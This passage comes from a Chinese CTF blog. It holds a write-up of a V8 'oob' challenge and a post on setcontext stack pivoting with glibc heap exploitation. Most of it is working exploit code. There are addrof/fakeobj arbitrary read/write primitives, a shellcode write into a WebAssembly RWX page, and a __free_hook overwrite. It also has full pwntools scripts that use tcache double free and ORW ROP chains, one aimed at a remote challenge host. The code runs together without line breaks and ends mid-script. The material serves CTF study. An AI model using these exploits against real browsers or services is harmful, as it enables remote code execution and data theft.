0x2754f16009e1 &lt;Map[56]&gt; - name: 0x2754f1604ae1 &lt;String[#1]: 0&gt; - kind: NormalFunction - function_map_index: 144 - formal_parameter_count: 0 - expected_nof_properties: 0 - language_mode: sloppy - data: 0x365390d5fa99 &lt;WasmExportedFunctionData&gt; - code (from data): 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt; - function token position: -1 - start position: -1 - end position: -1 - no debug info - scope info: 0x2754f1600c61 &lt;ScopeInfo[0]&gt; - length: 0 - feedback_metadata: 0x2754f1602a39: [FeedbackMetadata] - map: 0x2754f1601319 &lt;Map&gt; - slot_count: 0\n\n继续跟进data。\npwndbg&gt; job 0x365390d5fa990x365390d5fa99: [WasmExportedFunctionData] in OldSpace - map: 0x2754f1605879 &lt;Map[40]&gt; - wrapper_code: 0x18b055a42001 &lt;Code JS_TO_WASM_FUNCTION&gt; - instance: 0x365390d5f901 &lt;Instance map = 0x309e6c9c9789&gt; - function_index: 0\n\n进一步查看instance\npwndbg&gt; telescope 0x365390d5f901-1 2000:0000│  0x365390d5f900 —▸ 0x309e6c9c9789 ◂— 0x2500002754f1600101:0008│  0x365390d5f908 —▸ 0x2754f1600c71 ◂— 0x2754f1600802:0010│  0x365390d5f910 —▸ 0x2754f1600c71 ◂— 0x2754f1600803:0018│  0x365390d5f918 —▸ 0x7fc28d7f0000 ◂— 0x004:0020│  0x365390d5f920 ◂— 0x1000005:0028│  0x365390d5f928 ◂— 0xffff06:0030│  0x365390d5f930 —▸ 0x55ec1cb0d818 —▸ 0x7ffd93629d90 ◂— 0x7ffd93629d9007:0038│  0x365390d5f938 —▸ 0x2754f1600c71 ◂— 0x2754f1600808:0040│  0x365390d5f940 —▸ 0x55ec1cb931e0 ◂— 0x009:0048│  0x365390d5f948 —▸ 0x2754f16004d1 ◂— 0x2754f160050a:0050│  0x365390d5f950 ◂— 0x0... ↓     3 skipped0e:0070│  0x365390d5f970 —▸ 0x55ec1cb93200 ◂— 0x00f:0078│  0x365390d5f978 —▸ 0x2754f16004d1 ◂— 0x2754f1600510:0080│  0x365390d5f980 —▸ 0x55ec1cb03b50 —▸ 0x2754f1600751 ◂— 0xce00002754f1600711:0088│  0x365390d5f988 —▸ 0x2ed8b8773000 ◂— movabs r10, 0x2ed8b8773260 /* 0x2ed8b8773260ba49 */12:0090│  0x365390d5f990 —▸ 0x9e8bdb4e4a1 ◂— 0x710000309e6c9c9113:0098│  0x365390d5f998 —▸ 0x9e8bdb4e711 ◂— 0x710000309e6c9cadpwndbg&gt; vmmap 0x2ed8b8773000LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA    0x2ed8b8773000     0x2ed8b8774000 rwxp     1000 0      [anon_2ed8b8773] +0x0\n\n可以看到在偏移为0x88处有rwx的段了。最后直接写入shellcode即可\n#!/usr/bin/env python# coding=utf-8# https://www.xi4oyu.top/from pwn import *def just8(data):    size = len(data)    real_size = size if size % 8 == 0 else size + (8 - size % 8)    return data.ljust(real_size, b&#x27;\\x00&#x27;)def to_js(data):    ret = &#x27;var sc_arr = [&#x27;    for i in range(0, len(data), 8):        if (i // 8) % 4 == 0:            ret += &#x27;\\n&#x27;        x = u64(data[i:i+8])        ret += &#x27;\\t&#x27; + hex(x) + &#x27;n,&#x27;    ret += &#x27;\\n]\\n&#x27;    return retdef call_exec(path, argv, envp):    sc = &#x27;&#x27;    sc += shellcraft.pushstr(path)    sc += shellcraft.mov(&#x27;rdi&#x27;, &#x27;rsp&#x27;)    sc += shellcraft.pushstr_array(&#x27;rsi&#x27;, argv)    sc += shellcraft.pushstr_array(&#x27;rdx&#x27;, envp)    sc += shellcraft.syscall(&#x27;SYS_execve&#x27;)    return sccontext.os = &#x27;linux&#x27;context.arch = &#x27;amd64&#x27;sc = &#x27;&#x27;sc = call_exec(&#x27;/usr/bin/xcalc&#x27;, [&#x27;xcalc&#x27;], [&#x27;DISPLAY=:0&#x27;])print(sc)data = asm(sc)data = just8(data)print(to_js(data))\n\n上面这是我抄的用于生成js的shellcode的python脚本，在开头留有原作者链接。\n最终expvar buf = new ArrayBuffer(8);var float64 = new Float64Array(buf);var uint64 = new BigUint64Array(buf);// @param &#123;float64&#125; float_num// @return &#123;uint64&#125;function f2i(float_num) &#123;    float64[0] = float_num;    return uint64[0];&#125;// @param &#123;uint64&#125; uint64_num// @return &#123;float64&#125;function i2f(uint64_num) &#123;    uint64[0] = uint64_num;    return float64[0];&#125;var obj = &#123; &quot;a&quot;: 1 &#125;;var obj_array = [obj];var flt_array = [1.1];var obj_array_map = obj_array.oob();var flt_array_map = flt_array.oob();function address_of(leak_obj) &#123;    obj_array[0] = leak_obj;    obj_array.oob(flt_array_map);    var res = obj_array[0];    obj_array.oob(obj_array_map);    return f2i(res);&#125;function fake_object(address) &#123;    flt_array[0] = i2f(address);    flt_array.oob(obj_array_map);    var fake_obj = flt_array[0];    flt_array.oob(flt_array_map);    return fake_obj;&#125;var arb_rw_arr = [flt_array_map, 1.2, 1.3, 1.4];console.log(&quot;arb_rw_arr =&gt; 0x&quot;, (address_of(arb_rw_arr) - 0x20n).toString(16).trim());var fake_obj = fake_object(address_of(arb_rw_arr) - 0x20n);function arbitrary_read(address) &#123;    arb_rw_arr[2] = i2f(address - 0x10n + 0x1n)    return f2i(fake_obj[0]);&#125;var buffer = new ArrayBuffer(16);var data_view = new DataView(buffer);var buf_backing_store_addr = address_of(buffer) - 1n + 0x20n;function arbitrary_write(address, value) &#123;    arb_rw_arr[2] = i2f(buf_backing_store_addr - 0x10n + 0x1n);    fake_obj[0] = i2f(address);    data_view.setFloat64(0, i2f(value), true);&#125;var a = [1.1];var code_addr = arbitrary_read(address_of(a.constructor) + 0x30n - 1n) - 1n;console.log(&#x27;code_addr =&gt; 0x&#x27; + code_addr.toString(16).trim());var v8_addr = arbitrary_read(code_addr + 0x42n);var v8_base = v8_addr - 0xfc8780n;console.log(&#x27;v8_base =&gt; 0x&#x27; + v8_base.toString(16).trim());var free_got_addr = v8_base + 0x12aa8b8n;var free_addr = arbitrary_read(free_got_addr);var libc_base = free_addr - 0x9a6d0n;console.log(&#x27;libc_base =&gt; 0x&#x27; + v8_base.toString(16).trim());var __free_hook = libc_base + 0x1eee48n;var system_addr = libc_base + 0x52290n;arbitrary_write(__free_hook, system_addr);%SystemBreak();function pwn() &#123;    let cmd = &quot;gnome-calculator\\x00&quot;;&#125;pwn()arbitrary_write(__free_hook, 0);\n\n\nvar buf = new ArrayBuffer(8);var float64 = new Float64Array(buf);var uint64 = new BigUint64Array(buf);// @param &#123;float64&#125; float_num// @return &#123;uint64&#125;function f2i(float_num) &#123;    float64[0] = float_num;    return uint64[0];&#125;// @param &#123;uint64&#125; uint64_num// @return &#123;float64&#125;function i2f(uint64_num) &#123;    uint64[0] = uint64_num;    return float64[0];&#125;var obj = &#123; &quot;a&quot;: 1 &#125;;var obj_array = [obj];var flt_array = [1.1];var obj_array_map = obj_array.oob();var flt_array_map = flt_array.oob();function address_of(leak_obj) &#123;    obj_array[0] = leak_obj;    obj_array.oob(flt_array_map);    var res = obj_array[0];    obj_array.oob(obj_array_map);    return f2i(res);&#125;function fake_object(address) &#123;    flt_array[0] = i2f(address);    flt_array.oob(obj_array_map);    var fake_obj = flt_array[0];    flt_array.oob(flt_array_map);    return fake_obj;&#125;var arb_rw_arr = [flt_array_map, 1.2, 1.3, 1.4];console.log(&quot;arb_rw_arr =&gt; 0x&quot; + (address_of(arb_rw_arr) - 0x20n).toString(16).trim());var fake_obj = fake_object(address_of(arb_rw_arr) - 0x20n);function arbitrary_read(address) &#123;    arb_rw_arr[2] = i2f(address - 0x10n + 0x1n)    return f2i(fake_obj[0]);&#125;var sc_arr = [    0x10101010101b848n, 0x62792eb848500101n, 0x431480101626d60n, 0x2f7273752fb84824n,    0x48e78948506e6962n, 0x1010101010101b8n, 0x6d606279b8485001n, 0x2404314801010162n,    0x1485e086a56f631n, 0x313b68e6894856e6n, 0x101012434810101n, 0x4c50534944b84801n,    0x6a52d231503d5941n, 0x894852e201485a08n, 0x50f583b6ae2n,];var buffer = new ArrayBuffer(sc_arr.length * 8);var data_view = new DataView(buffer);var buf_backing_store_addr = address_of(buffer) - 1n + 0x20n;function arbitrary_write(address, value) &#123;    arb_rw_arr[2] = i2f(buf_backing_store_addr - 0x10n + 0x1n);    fake_obj[0] = i2f(address);    for (let i = 0; i &lt; value.length; i++) &#123;        data_view.setFloat64(i * 8, i2f(value[i]), true);    &#125;&#125;var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);var pwn = wasmInstance.exports.main;var pwn_addr = address_of(pwn);console.log(&quot;pwn_addr =&gt; 0x&quot; + pwn_addr.toString(16).trim());var shared_info_addr = arbitrary_read(pwn_addr - 1n + 0x18n);console.log(&quot;shared_info_addr =&gt; 0x&quot; + shared_info_addr.toString(16).trim());var data_addr = arbitrary_read(shared_info_addr - 1n + 0x8n);console.log(&quot;data_addr =&gt; 0x&quot; + data_addr.toString(16).trim());var instance_addr = arbitrary_read(data_addr - 1n + 0x10n);console.log(&quot;instance_addr =&gt; 0x&quot; + instance_addr.toString(16).trim());var rwx_addr = arbitrary_read(instance_addr - 1n + 0x88n);console.log(&quot;rwx_addr =&gt; 0x&quot; + rwx_addr.toString(16).trim());arbitrary_write(rwx_addr, sc_arr);pwn();\n\n\n","categories":["chrome-pwn"],"tags":["overstep"]},{"title":"从两道题目看setcontext","url":"/2022/03/10/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E7%9B%AE%E7%9C%8Bsetcontext/","content":"\n现在的比赛，越来越卷了，所以出题人为了让选手难受一般都会开始沙盒这时候只能进行orw，不过在栈里面这种方式还是常见。但是在堆利用当中我们更多的是修改hook为system或者one_gadget，为了能够实现orw就出现了新的手法 堆中栈迁移\n\nGlibc2.29以下首先先看一下在glibc2.29以下的此类利用方式\n0x00007f1c03351180 &lt;+0&gt;:\tpush   rdi0x00007f1c03351181 &lt;+1&gt;:\tlea    rsi,[rdi+0x128]0x00007f1c03351188 &lt;+8&gt;:\txor    edx,edx0x00007f1c0335118a &lt;+10&gt;:\tmov    edi,0x20x00007f1c0335118f &lt;+15&gt;:\tmov    r10d,0x80x00007f1c03351195 &lt;+21&gt;:\tmov    eax,0xe0x00007f1c0335119a &lt;+26&gt;:\tsyscall 0x00007f1c0335119c &lt;+28&gt;:\tpop    rdi0x00007f1c0335119d &lt;+29&gt;:\tcmp    rax,0xfffffffffffff0010x00007f1c033511a3 &lt;+35&gt;:\tjae    0x7f1c03351200 &lt;setcontext+128&gt;0x00007f1c033511a5 &lt;+37&gt;:\tmov    rcx,QWORD PTR [rdi+0xe0]0x00007f1c033511ac &lt;+44&gt;:\tfldenv [rcx]0x00007f1c033511ae &lt;+46&gt;:\tldmxcsr DWORD PTR [rdi+0x1c0]0x00007f1c033511b5 &lt;+53&gt;:\tmov    rsp,QWORD PTR [rdi+0xa0]0x00007f1c033511bc &lt;+60&gt;:\tmov    rbx,QWORD PTR [rdi+0x80]0x00007f1c033511c3 &lt;+67&gt;:\tmov    rbp,QWORD PTR [rdi+0x78]0x00007f1c033511c7 &lt;+71&gt;:\tmov    r12,QWORD PTR [rdi+0x48]0x00007f1c033511cb &lt;+75&gt;:\tmov    r13,QWORD PTR [rdi+0x50]0x00007f1c033511cf &lt;+79&gt;:\tmov    r14,QWORD PTR [rdi+0x58]0x00007f1c033511d3 &lt;+83&gt;:\tmov    r15,QWORD PTR [rdi+0x60]0x00007f1c033511d7 &lt;+87&gt;:\tmov    rcx,QWORD PTR [rdi+0xa8]0x00007f1c033511de &lt;+94&gt;:\tpush   rcx0x00007f1c033511df &lt;+95&gt;:\tmov    rsi,QWORD PTR [rdi+0x70]0x00007f1c033511e3 &lt;+99&gt;:\tmov    rdx,QWORD PTR [rdi+0x88]0x00007f1c033511ea &lt;+106&gt;:\tmov    rcx,QWORD PTR [rdi+0x98]0x00007f1c033511f1 &lt;+113&gt;:\tmov    r8,QWORD PTR [rdi+0x28]0x00007f1c033511f5 &lt;+117&gt;:\tmov    r9,QWORD PTR [rdi+0x30]0x00007f1c033511f9 &lt;+121&gt;:\tmov    rdi,QWORD PTR [rdi+0x68]0x00007f1c033511fd &lt;+125&gt;:\txor    eax,eax0x00007f1c033511ff &lt;+127&gt;:\tret    \n\n可以看到这里是以rdi为基地址向其他寄存器写入值，并且这里可以控制rsp和rip，虽然上面没有直接向rip写，但是上面是先写在rcx再将rcx进栈随后ret，所以rcx的值其实也就是最后rip的值。\nCISCN2021-silverwolf题目的代码很清晰，流程很容易分析所以自己下去分析一下\nunsigned __int64 delete()&#123;  __int64 v1; // [rsp+0h] [rbp-18h] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-10h]  v2 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1144, &amp;v1);  if ( !v1 &amp;&amp; chunk )    free(chunk);  return __readfsqword(0x28u) ^ v2;&#125;\n\ndelete存在很明显的UAF漏洞，泄漏heap地址和libc地址这里就不在赘述，这里提一下tcache double free的检测，这道提的libc版本是2.27-3ubuntu1.3虽然是2.27但是已经加了检测机制，所以可以当作2.29来打，这里先看一下检测的源码\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\n可以看到我们chunk进入tcache之后会将key位其实也就是bk位设置为tcache地址\nif (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;    /* Check to see if it&#x27;s already in the tcache.  */    tcache_entry *e = (tcache_entry *) chunk2mem (p);    /* This test succeeds on double free.  However, we don&#x27;t 100%\t   trust it (it also matches random payload data at a 1 in\t   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely\t   coincidence before aborting.  */    if (__glibc_unlikely (e-&gt;key == tcache))    &#123;        tcache_entry *tmp;        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx];             tmp;             tmp = tmp-&gt;next)            if (tmp == e)                malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);        /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */    &#125;    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)    &#123;        tcache_put (p, tc_idx);        return;    &#125;r.recvuntil(b&#x27;Please input index?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))&#125;\n\n然后再验证free的chunk的key位是否为tcache地址，所以只需要覆盖掉就好了。\n所以思路就很简单了，只需要通过double free控制tcache struct，然后覆盖掉free_hook为setcontext+53，不过需要注意的是这里的堆能写入的最大值为0x78所以，我们在构造rdi+0xa0和rdi+0xa8时需要用到两个chunk，还有一点很坑的就是在进行rop时不能直接调用open\n0x00007f1c0340ed49 &lt;+57&gt;:\ttest   eax,eax0x00007f1c0340ed4b &lt;+59&gt;:\tjne    0x7f1c0340edb6 &lt;__libc_open64+166&gt;0x00007f1c0340ed4d &lt;+61&gt;:\tmov    edx,esi0x00007f1c0340ed4f &lt;+63&gt;:\tmov    eax,0x1010x00007f1c0340ed54 &lt;+68&gt;:\tmov    rsi,rdi0x00007f1c0340ed57 &lt;+71&gt;:\tmov    edi,0xffffff9c0x00007f1c0340ed5c &lt;+76&gt;:\tsyscall \n\n反汇编存在以下几行，这里进行syscall时rax其实并不是2\n&gt;&gt; seccomp-tools dump ./silverwolf line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL\n\n可以看到这里的沙盒限制了，所以直接使用地址调用open是不行的需要自己赋值rax，最后这里给出上面题目的exp\nfrom pwn import *elf = ELF(&#x27;./silverwolf&#x27;)# r = process(&#x27;./silverwolf&#x27;)r = remote(&#x27;1.14.71.254&#x27;, 28017)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.arch = &#x27;amd64&#x27;def menu(options):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(bytes(str(options), encoding=&#x27;utf-8&#x27;))def create(size):    menu(1)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))def edit(content):    menu(2)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)    r.recvuntil(b&#x27;Content: &#x27;)    r.sendline(content)def show():    menu(3)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)def delete():    menu(4)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(b&#x27;0&#x27;)for i in range(12):    create(0x10)create(0x50)for i in range(11):    create(0x60)for i in range(7):    create(0x70)create(0x78)delete()edit(b&#x27;\\x00&#x27;*0x10)delete()show()r.recvuntil(b&#x27;Content: &#x27;)heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))heap_base = heap_addr-0x1920print(&quot;heap_base=&gt;&quot;, hex(heap_base))edit(p64(heap_base+0x10))create(0x78)create(0x78)payload = b&#x27;a&#x27;*0x70+p64(0)edit(payload)delete()show()r.recvuntil(b&#x27;Content: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))__free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]puts_addr = libc_base+libc.symbols[&#x27;puts&#x27;]setcontext_addr = libc_base+libc.symbols[&#x27;setcontext&#x27;]+53syscall_addr = libc_base+next(libc.search(asm(&#x27;syscall\\nret&#x27;)))pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))pop_rax = libc_base+next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))ret_addr = libc_base+next(libc.search(asm(&#x27;ret&#x27;)))payload = b&#x27;\\x02&#x27;+b&#x27;\\x00&#x27;*4+b&#x27;\\x02&#x27;*2+b&#x27;\\x00&#x27;*4+b&#x27;\\x03&#x27;+b&#x27;\\x00&#x27;+b&#x27;\\x02&#x27;payload = payload.ljust(0x40, b&#x27;\\x00&#x27;)+p64(heap_base+0x400)payload = payload.ljust(0x68, b&#x27;\\x00&#x27;)+p64(heap_base+0x1130+0x10) + \\    p64(heap_base+0x1560+0x10)edit(payload)create(0x10)edit(b&#x27;./flag\\x00\\x00&#x27;)flag_addr = heap_base+0x400bss = libc_base+libc.bss()+0x100rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(pop_rax) + \\    p64(constants.SYS_open)+p64(syscall_addr)rop_chain += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss)+p64(pop_rdx) + \\    p64(0x30)+p64(read_addr)rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)create(0x78)delete()edit(p64(libc_base+libc.symbols[&#x27;__free_hook&#x27;]))create(0x78)edit(rop_chain)rop_addr = heap_base+0x1560+0x10create(0x68)delete()edit(p64(heap_base+0x10c0+0x10))create(0x68)edit(b&#x27;\\x00&#x27;*0x30+p64(rop_addr)+p64(ret_addr))create(0x78)edit(p64(setcontext_addr))create(0x68)delete()r.interactive()\n\nGlibc2.29以上0x00007f37b1e420dd &lt;+61&gt;:\tmov    rsp,QWORD PTR [rdx+0xa0]0x00007f37b1e420e4 &lt;+68&gt;:\tmov    rbx,QWORD PTR [rdx+0x80]0x00007f37b1e420eb &lt;+75&gt;:\tmov    rbp,QWORD PTR [rdx+0x78]0x00007f37b1e420ef &lt;+79&gt;:\tmov    r12,QWORD PTR [rdx+0x48]0x00007f37b1e420f3 &lt;+83&gt;:\tmov    r13,QWORD PTR [rdx+0x50]0x00007f37b1e420f7 &lt;+87&gt;:\tmov    r14,QWORD PTR [rdx+0x58]0x00007f37b1e420fb &lt;+91&gt;:\tmov    r15,QWORD PTR [rdx+0x60]\t... ...0x00007f37b1e421c6 &lt;+294&gt;:\tmov    rcx,QWORD PTR [rdx+0xa8]0x00007f37b1e421cd &lt;+301&gt;:\tpush   rcx0x00007f37b1e421ce &lt;+302&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]0x00007f37b1e421d2 &lt;+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]0x00007f37b1e421d6 &lt;+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]0x00007f37b1e421dd &lt;+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]0x00007f37b1e421e1 &lt;+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]0x00007f37b1e421e5 &lt;+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]0x00007f37b1e421ec &lt;+332&gt;:\txor    eax,eax0x00007f37b1e421ee &lt;+334&gt;:\tret\n\n可以看到在glibc2.29以上的版本是以rdx作为索引的，这时我们就需要一个gadget可以操作rdx了getkeyserv_handle\n0x00007f3ddba96930 &lt;+576&gt;:\tmov    rdx,QWORD PTR [rdi+0x8]0x00007f3ddba96934 &lt;+580&gt;:\tmov    QWORD PTR [rsp],rax0x00007f3ddba96938 &lt;+584&gt;:\tcall   QWORD PTR [rdx+0x20]\n\n所以此时我们就可以根据rdi继续操作rdx实现栈劫持\n2021DASCTF 3月ParentSimulator题目的流程很是很简单，结构很清晰可以分析出来\nint sub_196B()&#123;  __int64 v0; // rax  int v2; // [rsp+Ch] [rbp-4h]  puts(&quot;Please input index?&quot;);  LODWORD(v0) = input_int();  v2 = v0;  if ( v0 &lt;= 9 )  &#123;    v0 = chunk_arr[v0];    if ( v0 )    &#123;      free(chunk_arr[v2]);      chunk_inuse[v2] = 0;      LODWORD(v0) = puts(&quot;Done&quot;);    &#125;  &#125;  return v0;&#125;\n\n在delete时没有检测chunk_inuse就直接free了\nint sub_1AB0()&#123;  char *v0; // rax  int v2; // [rsp+8h] [rbp-8h]  int v3; // [rsp+Ch] [rbp-4h]  printf(&quot;You only have 1 chances to change your child&#x27;s gender, left: %d\\n&quot;, dword_4010);  LODWORD(v0) = dword_4010;  if ( dword_4010 )  &#123;    puts(&quot;Please input index?&quot;);    LODWORD(v0) = input_int();    v2 = v0;    if ( v0 &lt;= 9 )    &#123;      v0 = chunk_arr[v0];      if ( v0 )      &#123;        --dword_4010;        printf(&quot;Current gender:%s\\n&quot;, (chunk_arr[v2] + 8LL));        puts(&quot;Please rechoose your child&#x27;s gender.\\n1.Boy\\n2.Girl:&quot;);        v3 = input_int();        if ( v3 == 1 )        &#123;          v0 = (chunk_arr[v2] + 8LL);          *v0 = 7958370;        &#125;        else if ( v3 == 2 )        &#123;          v0 = (chunk_arr[v2] + 8LL);          strcpy(v0, &quot;girl&quot;);        &#125;        else        &#123;          LODWORD(v0) = puts(&quot;oho, you choose a invalid gender.&quot;);        &#125;      &#125;    &#125;  &#125;  return v0;&#125;\n\n并且在改变性别时也是没有检测chunk_inuse，而且改变性别的位置正好是bk指针，所以可以实现tcache double free\n解法1：\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &#x27;amd64&#x27;def menu(option):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.send(bytes(str(option), encoding=&#x27;utf8&#x27;)+b&#x27;\\n&#x27;)def create(idx, gender, name):    menu(1)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;2.Girl:&quot;)    r.send(bytes(str(gender), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;Please input your child&#x27;s name:&quot;)    r.send(name)def change_name(idx, name):    menu(2)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;Please input your child&#x27;s new name:&quot;)    r.send(name)def show(idx):    menu(3)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))def delete(idx):    menu(4)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, description):    menu(5)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;description:&quot;)    r.send(description)def change_gender(idx, gender):    menu(666)    r.recvuntil(b&#x27;Please input index?&#x27;)    r.send(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&quot;2.Girl:&quot;)    r.send(bytes(str(gender), encoding=&#x27;utf8&#x27;))context.log_level = &#x27;debug&#x27;create(0, 1, b&#x27;cml&#x27;)delete(0)change_gender(0, 2)delete(0)create(0, 1, b&#x27;cml&#x27;)create(1, 1, b&#x27;cml&#x27;)create(2, 1, b&#x27;cml&#x27;)delete(1)delete(2)show(0)r.recvuntil(b&#x27;Gender: &#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10print(&quot;heap_base=&gt;&quot;, hex(heap_base))create(1, 1, b&#x27;cml&#x27;)create(2, 1, b&#x27;cml&#x27;)delete(1)delete(2)change_name(0, p64(heap_base+0x10)[:-1])create(1, 1, b&#x27;cml&#x27;)create(2, 2, b&#x27;\\x00&#x27;*7)edit(2, b&#x27;\\x00&#x27;*14+b&#x27;\\x08&#x27;)delete(1)show(0)r.recvuntil(b&#x27;Gender: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))setcontext_addr = libc_base+libc.symbols[&#x27;setcontext&#x27;]+61free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]open_addr = libc_base+libc.symbols[&#x27;open&#x27;]read_addr = libc_base+libc.symbols[&#x27;read&#x27;]puts_addr = libc_base+libc.symbols[&#x27;puts&#x27;]pop_rdi = libc_base+next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rdx_r12 = libc_base+0x000000000011c371ret_addr = libc_base+next(libc.search(asm(&#x27;ret&#x27;)))gadget = libc_base+0x1546f0+576&#x27;&#x27;&#x27;   0x00007f3ddba96930 &lt;+576&gt;:\tmov    rdx,QWORD PTR [rdi+0x8]   0x00007f3ddba96934 &lt;+580&gt;:\tmov    QWORD PTR [rsp],rax   0x00007f3ddba96938 &lt;+584&gt;:\tcall   QWORD PTR [rdx+0x20]&#x27;&#x27;&#x27;bss = libc_base+libc.bss()+0x300flag_addr = heap_base+0x4c0rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(open_addr)rop_chain += p64(pop_rdi)+p64(4)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)edit(2, b&#x27;\\x00&#x27;*15)create(1, 1, b&#x27;aaaaaaa&#x27;)create(3, 1, b&#x27;flag\\x00\\x00\\x00&#x27;)edit(3, rop_chain)print(hex(puts_addr))rop_chain_addr = heap_base+0x4d0create(4, 1, b&#x27;aaaaaaa&#x27;)arg_addr = heap_base+0x5e0payload = b&#x27;\\x00&#x27;*14+b&#x27;\\x01&#x27;payload = payload.ljust(0xe8, b&#x27;\\x00&#x27;)+p64(arg_addr)edit(2, payload[:-1])create(5, 1, b&#x27;shell&#x27;)payload = p64(0)+p64(arg_addr)payload = payload.ljust(0x20, 